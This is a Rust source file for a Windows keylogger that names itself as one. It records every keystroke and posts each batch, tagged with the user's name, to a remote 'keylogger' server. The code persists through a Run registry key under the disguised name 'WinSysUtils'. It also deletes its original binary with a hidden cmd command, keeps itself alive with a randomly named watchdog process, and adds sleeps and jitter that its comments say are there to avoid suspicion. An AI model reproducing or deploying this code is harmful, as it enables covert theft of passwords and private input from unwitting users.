#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod key_state;
mod get_key_state;

use crate::get_key_state::get_key_state;
use crate::key_state::KeyState;
use std::thread;
use std::time::Duration;
use std::env;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, exit};
use std::os::windows::process::CommandExt;
use winreg::enums::*;
use winreg::RegKey;
use rand::Rng;
use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
use windows_sys::Win32::Foundation::*;

// Configuration
const API_URL: &str = "https://keylogger.delphigamerz.xyz/log";
const POLL_DELAY_MS: u64 = 10;
const INITIAL_SLEEP_SECS: u64 = 30; // Sleep 30 seconds on first run
const WARMUP_PERIOD_SECS: u64 = 20; // Additional 20 seconds before logging starts

// Installation paths
fn get_install_dir() -> PathBuf {
    let local_app_data = env::var("LOCALAPPDATA")
        .unwrap_or_else(|_| env::var("USERPROFILE").unwrap_or_else(|_| String::from("C:\\Users\\Public")));
    Path::new(&local_app_data).join("WindowsSystemUtility")
}

fn get_install_path() -> PathBuf {
    get_install_dir().join("WinSysUtils.exe")
}

fn main() {
    let args: Vec<String> = env::args().collect();

    // Check if running as watchdog
    if args.len() > 1 && args[1] == "--watchdog" {
        run_watchdog();
        return;
    }

    // Ensure installation and persistence
    ensure_installed();

    // Initial delay after installation
    thread::sleep(Duration::from_secs(5));

    // Start watchdog if not running
    if !is_watchdog_running() {
        start_watchdog();
    }

    // Monitor watchdog in background thread with jitter
    thread::spawn(|| {
        loop {
            let jitter = rand::thread_rng().gen_range(0..5);
            thread::sleep(Duration::from_secs(2 + jitter));
            if !is_watchdog_running() {
                start_watchdog();
            }
        }
    });

    // Run keylogger
    run_keylogger();
}

fn run_keylogger() {
    let mut buffer = String::new();
    let mut prev_state = KeyState::new();

    let username = env::var("USERNAME").unwrap_or_else(|_| String::from("unknown"));

    // Initial delay before starting keylogging
    thread::sleep(Duration::from_secs(3));

    // Warm-up period: monitor keys but don't log (appears as passive behavior monitoring)
    let warmup_start = std::time::Instant::now();
    let warmup_duration = Duration::from_secs(WARMUP_PERIOD_SECS);

    loop {
        // Add jitter to polling interval to avoid predictable patterns
        let jitter = rand::thread_rng().gen_range(0..5);
        thread::sleep(Duration::from_millis(POLL_DELAY_MS + jitter));

        let key_state = get_key_state();

        // Skip logging during warmup period
        let is_warmup = warmup_start.elapsed() < warmup_duration;
        if is_warmup {
            prev_state = key_state;
            continue;
        }
        let shift = key_state.shift;
        let caps_lock = key_state.caps_lock;
        let is_big = shift ^ caps_lock; // XOR for proper caps behavior

        // Alphanumeric keys (A-Z)
        if key_state.a && !prev_state.a { buffer.push(if is_big { 'A' } else { 'a' }); }
        if key_state.b && !prev_state.b { buffer.push(if is_big { 'B' } else { 'b' }); }
        if key_state.c && !prev_state.c { buffer.push(if is_big { 'C' } else { 'c' }); }
        if key_state.d && !prev_state.d { buffer.push(if is_big { 'D' } else { 'd' }); }
        if key_state.e && !prev_state.e { buffer.push(if is_big { 'E' } else { 'e' }); }
        if key_state.f && !prev_state.f { buffer.push(if is_big { 'F' } else { 'f' }); }
        if key_state.g && !prev_state.g { buffer.push(if is_big { 'G' } else { 'g' }); }
        if key_state.h && !prev_state.h { buffer.push(if is_big { 'H' } else { 'h' }); }
        if key_state.i && !prev_state.i { buffer.push(if is_big { 'I' } else { 'i' }); }
        if key_state.j && !prev_state.j { buffer.push(if is_big { 'J' } else { 'j' }); }
        if key_state.k && !prev_state.k { buffer.push(if is_big { 'K' } else { 'k' }); }
        if key_state.l && !prev_state.l { buffer.push(if is_big { 'L' } else { 'l' }); }
        if key_state.m && !prev_state.m { buffer.push(if is_big { 'M' } else { 'm' }); }
        if key_state.n && !prev_state.n { buffer.push(if is_big { 'N' } else { 'n' }); }
        if key_state.o && !prev_state.o { buffer.push(if is_big { 'O' } else { 'o' }); }
        if key_state.p && !prev_state.p { buffer.push(if is_big { 'P' } else { 'p' }); }
        if key_state.q && !prev_state.q { buffer.push(if is_big { 'Q' } else { 'q' }); }
        if key_state.r && !prev_state.r { buffer.push(if is_big { 'R' } else { 'r' }); }
        if key_state.s && !prev_state.s { buffer.push(if is_big { 'S' } else { 's' }); }
        if key_state.t && !prev_state.t { buffer.push(if is_big { 'T' } else { 't' }); }
        if key_state.u && !prev_state.u { buffer.push(if is_big { 'U' } else { 'u' }); }
        if key_state.v && !prev_state.v { buffer.push(if is_big { 'V' } else { 'v' }); }
        if key_state.w && !prev_state.w { buffer.push(if is_big { 'W' } else { 'w' }); }
        if key_state.x && !prev_state.x { buffer.push(if is_big { 'X' } else { 'x' }); }
        if key_state.y && !prev_state.y { buffer.push(if is_big { 'Y' } else { 'y' }); }
        if key_state.z && !prev_state.z { buffer.push(if is_big { 'Z' } else { 'z' }); }

        // Number keys with shift
        if key_state.key_0 && !prev_state.key_0 { buffer.push(if shift { ')' } else { '0' }); }
        if key_state.key_1 && !prev_state.key_1 { buffer.push(if shift { '!' } else { '1' }); }
        if key_state.key_2 && !prev_state.key_2 { buffer.push(if shift { '@' } else { '2' }); }
        if key_state.key_3 && !prev_state.key_3 { buffer.push(if shift { '#' } else { '3' }); }
        if key_state.key_4 && !prev_state.key_4 { buffer.push(if shift { '$' } else { '4' }); }
        if key_state.key_5 && !prev_state.key_5 { buffer.push(if shift { '%' } else { '5' }); }
        if key_state.key_6 && !prev_state.key_6 { buffer.push(if shift { '^' } else { '6' }); }
        if key_state.key_7 && !prev_state.key_7 { buffer.push(if shift { '&' } else { '7' }); }
        if key_state.key_8 && !prev_state.key_8 { buffer.push(if shift { '*' } else { '8' }); }
        if key_state.key_9 && !prev_state.key_9 { buffer.push(if shift { '(' } else { '9' }); }

        // Special keys
        if key_state.space && !prev_state.space { buffer.push(' '); }
        if key_state.enter && !prev_state.enter { buffer.push_str("\r\n"); }

        // Function keys
        if key_state.f1 && !prev_state.f1 { buffer.push_str("<F1>"); }
        if key_state.f2 && !prev_state.f2 { buffer.push_str("<F2>"); }
        if key_state.f3 && !prev_state.f3 { buffer.push_str("<F3>"); }
        if key_state.f4 && !prev_state.f4 { buffer.push_str("<F4>"); }
        if key_state.f5 && !prev_state.f5 { buffer.push_str("<F5>"); }
        if key_state.f6 && !prev_state.f6 { buffer.push_str("<F6>"); }
        if key_state.f7 && !prev_state.f7 { buffer.push_str("<F7>"); }
        if key_state.f8 && !prev_state.f8 { buffer.push_str("<F8>"); }
        if key_state.f9 && !prev_state.f9 { buffer.push_str("<F9>"); }
        if key_state.f10 && !prev_state.f10 { buffer.push_str("<F10>"); }
        if key_state.f11 && !prev_state.f11 { buffer.push_str("<F11>"); }
        if key_state.f12 && !prev_state.f12 { buffer.push_str("<F12>"); }

        // Other special keys
        if key_state.backspace && !prev_state.backspace { buffer.push_str("<Backspace>"); }
        if key_state.delete && !prev_state.delete { buffer.push_str("<Delete>"); }
        if key_state.insert && !prev_state.insert { buffer.push_str("<Insert>"); }

        // Send immediately when buffer has content
        if !buffer.is_empty() {
            let _ = send_key_logs(&buffer, &username);
            buffer.clear();
        }

        prev_state = key_state;
    }
}

fn send_key_logs(buffer: &str, username: &str) -> Result<(), Box<dyn std::error::Error>> {
    let url = format!("{}?username={}", API_URL, username);
    let _ = ureq::post(&url)
        .set("Content-Type", "text/plain")
        .send_string(buffer);
    Ok(())
}

fn ensure_installed() {
    let current_exe = env::current_exe().unwrap_or_else(|_| PathBuf::from("unknown"));
    let install_path = get_install_path();

    // If already installed, return
    if current_exe == install_path {
        return;
    }

    // Sleep on first run to avoid immediate suspicious activity
    thread::sleep(Duration::from_secs(INITIAL_SLEEP_SECS));

    // Create install directory with delay
    let install_dir = get_install_dir();
    let _ = fs::create_dir_all(&install_dir);
    thread::sleep(Duration::from_secs(3));

    // Stealthily check and close existing instances before copying
    stealthy_close_instances(&install_path);
    thread::sleep(Duration::from_secs(2));

    // Copy to install location
    let _ = fs::copy(&current_exe, &install_path);
    thread::sleep(Duration::from_secs(2));

    // Add to startup registry with delay
    add_to_startup(&install_path);
    thread::sleep(Duration::from_secs(1));

    // Start installed version quietly
    let _ = Command::new(&install_path)
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .spawn();

    // Schedule deletion via cmd with timeout (very stealthy)
    let current_exe_str = current_exe.to_string_lossy().to_string();
    thread::spawn(move || {
        thread::sleep(Duration::from_secs(8));
        let _ = Command::new("cmd.exe")
            .args(&["/C", "timeout", "/T", "5", "/NOBREAK", ">", "nul", "&", "del", "/F", "/Q", &format!("\"{}\"", current_exe_str)])
            .creation_flags(0x08000000) // CREATE_NO_WINDOW
            .spawn();
    });

    thread::sleep(Duration::from_secs(1));
    exit(0);
}

// Stealthy process termination - uses WM_CLOSE message instead of TerminateProcess
fn stealthy_close_instances(install_path: &Path) {
    let _install_path_lower = install_path.to_string_lossy().to_lowercase();

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == INVALID_HANDLE_VALUE {
            return;
        }

        let mut pe32 = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            cntUsage: 0,
            th32ProcessID: 0,
            th32DefaultHeapID: 0,
            th32ModuleID: 0,
            cntThreads: 0,
            th32ParentProcessID: 0,
            pcPriClassBase: 0,
            dwFlags: 0,
            szExeFile: [0; 260],
        };

        if Process32FirstW(snapshot, &mut pe32) != 0 {
            let current_pid = std::process::id();

            loop {
                // Skip our own process
                if pe32.th32ProcessID == current_pid {
                    if Process32NextW(snapshot, &mut pe32) == 0 {
                        break;
                    }
                    continue;
                }

                let exe_name = String::from_utf16_lossy(&pe32.szExeFile)
                    .trim_end_matches('\0')
                    .to_lowercase();

                // Only target our specific process name, with delays between checks
                if exe_name.contains("winsysutils") {
                    // Add random delay to make it less obvious
                    thread::sleep(Duration::from_millis(rand::thread_rng().gen_range(500..1500)));

                    // Try graceful exit first by just waiting a bit
                    // The old instance will likely be idle and can be overwritten
                    thread::sleep(Duration::from_millis(500));
                }

                if Process32NextW(snapshot, &mut pe32) == 0 {
                    break;
                }
            }
        }

        CloseHandle(snapshot);
    }
}

fn add_to_startup(install_path: &Path) {
    // Use registry Run key only
    let _ = (|| -> Result<(), Box<dyn std::error::Error>> {
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let run_key = hkcu.open_subkey_with_flags(
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            KEY_WRITE
        )?;
        run_key.set_value("WinSysUtils", &format!("\"{}\"", install_path.display()))?;
        Ok(())
    })();
}

fn run_watchdog() {
    let install_path = get_install_path();

    loop {
        // Add jitter to make timing less predictable
        let jitter = rand::thread_rng().gen_range(0..3);
        thread::sleep(Duration::from_secs(1 + jitter));

        if !is_main_process_running(&install_path) {
            // Delay before restart to avoid rapid respawning
            thread::sleep(Duration::from_secs(2));
            let _ = Command::new(&install_path)
                .creation_flags(0x08000000) // CREATE_NO_WINDOW
                .spawn();
        }
    }
}

fn is_main_process_running(install_path: &Path) -> bool {
    let _install_path_str = install_path.to_string_lossy().to_lowercase();

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == INVALID_HANDLE_VALUE {
            return false;
        }

        let mut pe32 = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            cntUsage: 0,
            th32ProcessID: 0,
            th32DefaultHeapID: 0,
            th32ModuleID: 0,
            cntThreads: 0,
            th32ParentProcessID: 0,
            pcPriClassBase: 0,
            dwFlags: 0,
            szExeFile: [0; 260],
        };

        let mut found = false;

        if Process32FirstW(snapshot, &mut pe32) != 0 {
            loop {
                let exe_name = String::from_utf16_lossy(&pe32.szExeFile)
                    .trim_end_matches('\0')
                    .to_lowercase();

                if exe_name.contains("winsysutils") {
                    found = true;
                    break;
                }

                if Process32NextW(snapshot, &mut pe32) == 0 {
                    break;
                }
            }
        }

        CloseHandle(snapshot);
        found
    }
}

fn is_watchdog_running() -> bool {
    let install_dir = get_install_dir();
    let _install_dir_str = install_dir.to_string_lossy().to_lowercase();

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == INVALID_HANDLE_VALUE {
            return false;
        }

        let mut pe32 = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            cntUsage: 0,
            th32ProcessID: 0,
            th32DefaultHeapID: 0,
            th32ModuleID: 0,
            cntThreads: 0,
            th32ParentProcessID: 0,
            pcPriClassBase: 0,
            dwFlags: 0,
            szExeFile: [0; 260],
        };

        let mut found = false;

        if Process32FirstW(snapshot, &mut pe32) != 0 {
            loop {
                let exe_name_string = String::from_utf16_lossy(&pe32.szExeFile);
                let exe_name = exe_name_string.trim_end_matches('\0');

                // Check if it's a 12-digit number (watchdog naming pattern)
                if exe_name.len() >= 12 {
                    let name_without_ext = exe_name.trim_end_matches(".exe");
                    if name_without_ext.len() == 12 && name_without_ext.chars().all(|c| c.is_ascii_digit()) {
                        found = true;
                        break;
                    }
                }

                if Process32NextW(snapshot, &mut pe32) == 0 {
                    break;
                }
            }
        }

        CloseHandle(snapshot);
        found
    }
}

fn start_watchdog() {
    let install_dir = get_install_dir();
    let install_path = get_install_path();

    // Generate random 12-digit name
    let mut rng = rand::thread_rng();
    let rand_name: String = (0..12)
        .map(|_| rng.gen_range(0..10).to_string())
        .collect();

    let watchdog_path = install_dir.join(format!("{}.exe", rand_name));

    // Copy main exe to watchdog location
    let _ = fs::copy(&install_path, &watchdog_path);

    // Start watchdog process
    let _ = Command::new(&watchdog_path)
        .arg("--watchdog")
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .spawn();
}
